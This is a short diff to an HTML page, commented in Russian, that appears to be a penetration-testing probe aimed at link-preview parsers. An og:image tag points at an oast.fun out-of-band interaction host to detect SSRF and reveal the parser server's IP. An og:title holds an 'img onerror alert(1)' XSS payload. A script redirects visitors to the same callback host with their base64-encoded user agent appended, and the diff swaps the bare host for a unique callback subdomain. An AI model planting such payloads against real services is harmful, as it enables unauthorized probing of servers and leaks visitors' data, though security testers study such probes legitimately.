@@ -2,7 +2,7 @@
 <html>
 <head>
     <!-- 1. Проверка на SSRF и получение IP сервера-парсера через картинку -->
-    <meta property="og:image" content="https://oast.fun">
+    <meta property="og:image" content="https://jcnxiqrzotvqzopexoxwrf8twt5d92xby.oast.fun">
     
     <!-- 2. Попытка внедрить HTML в заголовок (если сервер плохо фильтрует) -->
     <meta property="og:title" content="<b>Test</b> <img src='x' onerror='alert(1)'>">
@@ -12,7 +12,7 @@
 <body>
     <!-- 3. Этот скрипт сработает ТОЛЬКО если человек сам кликнет по ссылке -->
     <script>
-        document.location = "https://oast.fun" + btoa(navigator.userAgent);
+        document.location = "https://jcnxiqrzotvqzopexoxwrf8twt5d92xby.oast.fun" + btoa(navigator.userAgent);
     </script>
 </body>
 </html>
